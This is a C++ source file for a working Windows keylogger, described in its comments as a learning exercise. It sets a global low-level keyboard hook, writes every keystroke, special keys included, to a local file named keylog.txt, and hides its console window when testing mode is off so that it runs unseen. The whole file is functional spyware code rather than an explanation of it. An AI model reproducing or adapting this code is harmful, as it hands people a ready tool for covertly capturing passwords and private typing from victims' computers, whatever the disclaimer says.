#include <iostream>
#include <Windows.h>
#include <fstream>
#include <map>
/*
* This keylogger was made only for practice and learning how to workwith windows api functions. This code shall not be used for malicious purposes. 
* Shoutout to @GiacomoLaw, as his keylogger gave me the idea as to how I can solve a big problem I had
*/

//Bool specified for testing. While in testing mode some functions may or may not be called for easier debugging
bool testing = true;

// dataSaviour is our file that we shall use as a temorary store for the keystrokes
std::ofstream dataSavior("keylog.txt", std::ios::app);
HHOOK hHook;

// Here we save a map of special keybuttons such as backspace, enter and what we should save on their occurrence. 
// Shift and Capital are left out, as we do not need to explicitly save them (we can tall that they where pressed by seeing capital numbers)
const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"[ENTER]\n" },
	{VK_SPACE,	" " },
	{VK_TAB,	"[TAB]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};

//Struct that contains the data provided by the hook callback. 
KBDLLHOOKSTRUCT kbdStruct;

void Invisible() {
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
}

//Hook callback. We use it to determine which character/key was pressed and save it accordingly
LRESULT CALLBACK Keyboardproc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Key is being pressed correctly
        if (wParam == WM_KEYDOWN) {
            
            //lParam points to a struct with the needed data. We cast it to match it with kdbStruct
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);            
            
            // SAVING PROCESS
            // Special keys will be hanled according to the map above
            if (keyname.find(kbdStruct.vkCode) != keyname.end()){
		        dataSavior << keyname.at(kbdStruct.vkCode);
	        } else {
		        char key;
		        
                // We check if caps lcoik is activated
		        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		        // We check if shift is being pressed (if caps + shift is pressed, they cancel each other out)
		        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			        || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		        {
			        lowercase = !lowercase;
		        }

		        // We use MapVirutalKeyExA() to transform the vkCode to a valid Char. MapVirtualExA automatically selects ANSI or UNiCODE version
		        key = MapVirtualKeyExA(kbdStruct.vkCode, MAPVK_VK_TO_CHAR, NULL);

		        // Checking if we have to write in upper/lowercase
		        if (!lowercase)
		        {
			        key = tolower(key);
		        }
		        dataSavior << char(key);
	        }
        }
        //flushing the data in the fle so we dont have to open and close it all the time
        dataSavior.flush();
    }
    
    // Calling the next Hook as to not break our chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// defining the Hook that shall be used. We use a LL (lowlevel) Hook
// "The WH_KEYBOARD_LL hook enables you to monitor keyboard input events about to be posted in a thread input queue"
// We also set the Callback function.
void SetHook() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboardproc, NULL, 0);
    if (testing && !hHook) {
        std::cout << "Something went wrong!" << std::endl;
    }
}

int main() {
    if (!testing) {
        Invisible();
    }

    SetHook();

    // We need a loop so the keylogger does not suddenly stop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
    }
}